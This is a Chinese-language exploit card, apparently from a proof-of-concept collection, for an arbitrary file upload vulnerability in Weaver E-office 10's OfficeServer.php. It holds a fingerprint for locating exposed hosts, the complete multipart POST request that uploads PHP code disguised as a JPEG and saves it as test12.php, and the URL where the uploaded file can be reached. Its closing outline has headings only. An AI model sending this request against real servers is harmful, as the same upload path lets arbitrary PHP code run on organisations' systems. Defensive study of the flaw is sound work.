# 泛微E-office10OfficeServer任意文件上传漏洞

- **系统**：泛微OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="eoffice10"`
- **请求**：`POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 395`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJO…`

**请求体 / payload**
```
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Content-Disposition: form-data; name="FileData"; filename="1.jpg"
Content-Type: image/jpeg
<?php phpinfo();unlink(__FILE__);?>
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Content-Disposition: form-data; name="FormData"
{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test12.php'}
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--

上传文件地址
/eoffice10/server/public/iWebOffice2015/Document/test12.php
```

**其他**
- 泛微E-office 10 OfficeServer 任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微OA E-office V10